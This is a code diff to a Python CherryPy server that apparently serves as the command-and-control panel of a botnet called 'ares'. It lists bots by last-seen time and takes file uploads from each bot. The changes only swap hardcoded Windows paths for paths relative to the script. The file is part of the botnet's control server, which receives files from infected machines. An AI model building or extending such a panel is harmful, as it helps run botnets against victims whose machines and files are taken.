@@ -4,10 +4,6 @@ import time
 import os
 
 
-UPLOAD_DIR = "uploads/"
-UPLOAD_URL = "/uploads/"
-
-
 def query_DB(sql, params=()):
     conn = sqlite3.connect('beta.db')
     cursor = conn.cursor()
@@ -40,7 +36,7 @@ class CNC(object):
         bot_list = query_DB("SELECT * FROM bots ORDER BY lastonline DESC")
         output = ""
         for bot in bot_list:
-            output += '<tr><td><a href="/cnc/bot?botid=%s">%s</a></td><td>%s</td><td><input type="checkbox" id="%s" class="botid" /></td></tr>' % (bot[0], bot[0], time.ctime(bot[1]), bot[0])
+            output += '<tr><td><a href="bot?botid=%s">%s</a></td><td>%s</td><td><input type="checkbox" id="%s" class="botid" /></td></tr>' % (bot[0], bot[0], time.ctime(bot[1]), bot[0])
         with open("List.html", "r") as f:
             html = f.read()
             html = html.replace("{{bot_table}}", output)
@@ -90,10 +86,10 @@ class API(object):
 
     @cherrypy.expose
     def upload(self, botid, src, uploaded):
-        up_dir = os.path.join(UPLOAD_DIR, botid)
+        up_dir = os.path.join(os.path.join(os.path.dirname(os.path.realpath(__file__)), "uploads"), botid)
         if not os.path.exists(up_dir):
             os.makedirs(up_dir)
-        while os.path.exists(up_dir + src):
+        while os.path.exists(os.path.join(up_dir, src)):
             src = "_" + src
         save_path = os.path.join(up_dir, src)
         outfile = open(save_path, 'wb')
@@ -103,7 +99,7 @@ class API(object):
                 break
             outfile.write(data)
         outfile.close()
-        up_url = UPLOAD_URL +  botid + "/" + src
+        up_url = "uploads/" +  botid + "/" + src
         return 'Uploaded: <a href="' + up_url + '">' + up_url + '</a>'
 
 
@@ -112,11 +108,11 @@ def main():
                 'server.socket_port': 80},
                 '/static': {
                     'tools.staticdir.on': True,
-                    'tools.staticdir.dir':  "C:/Users/Kevin_2/Desktop/ares/server/static"
+                    'tools.staticdir.dir':  os.path.join(os.path.dirname(os.path.realpath(__file__)), "static")
                 },
                 '/uploads': {
                     'tools.staticdir.on': True,
-                    'tools.staticdir.dir':  "C:/Users/Kevin_2/Desktop/ares/server/uploads"
+                    'tools.staticdir.dir':  os.path.join(os.path.dirname(os.path.realpath(__file__)), "uploads")
                 },
                }
     app = Main()
